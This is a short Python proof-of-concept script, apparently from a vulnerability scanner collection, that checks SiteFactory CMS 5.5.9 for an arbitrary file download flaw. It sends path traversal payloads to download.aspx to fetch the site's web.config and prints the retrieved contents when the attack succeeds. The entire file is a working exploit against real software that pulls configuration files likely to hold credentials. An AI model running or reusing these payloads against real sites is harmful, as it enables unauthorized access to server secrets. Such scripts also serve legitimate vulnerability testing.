#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: SiteFactory CMS 5.5.9任意文件下载漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-062598
author: Lucifer
description: 文件/jyxx/manage/download.aspx参数File未过滤可下载任意文件。
'''
import sys
import requests
import warnings
from termcolor import cprint

class xtcms_download_filedownload_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payloads = ["/manage/download.aspx?File=../web.config",
                    "/web/manage/download.aspx?File=../web.config"]
        try:
            noexist = True
            for payload in payloads:
                vulnurl = self.url + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if req.headers["Content-Type"] == "application/xml":
                    cprint("[+]存在SiteFactory CMS 5.5.9任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")
                    return True, vulnurl, "SiteFactory CMS 5.5.9任意文件下载漏洞", payload, req.text
            if noexist:
                cprint("[-]不存在xtcms_download_filedownload漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = xtcms_download_filedownload_BaseVerify(sys.argv[1])
    testVuln.run()